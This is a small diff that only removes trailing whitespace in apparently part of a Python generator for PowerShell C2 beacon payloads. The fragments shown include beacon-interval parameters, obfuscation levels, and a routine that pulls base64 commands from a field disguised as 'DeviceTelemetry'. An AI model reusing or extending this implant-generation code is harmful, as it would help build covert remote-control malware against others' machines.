@@ -60,7 +60,7 @@ def make_raw(ip, port, beacon_interval, headers, useragent, accept, byte_range, 
 		grab_output = textwrap.dedent("""
 			if ($task.DeviceTelemetry) {
 				$cmd_b64 = $task.DeviceTelemetry.Telemetry;
-			
+
 		""").replace("\n", "")
 		#send_output = "$output = $results|Out-String;"
 		send_output = "$body = @{ output = $b64 } | ConvertTo-Json;"
@@ -173,7 +173,7 @@ def generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, us
 		cmd = payutils.encode_win_payload(payload, no_child)
 		payutils.copy_and_print(cmd)
 		return cmd
-		
+
 	"""else:
 		return _obfuscate_level3(template)"""
 
@@ -441,5 +441,5 @@ def generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval,
 	"Start-Sleep -Seconds $delay;"
 	"}"
 )
-	
+
 	return ps_lines"""
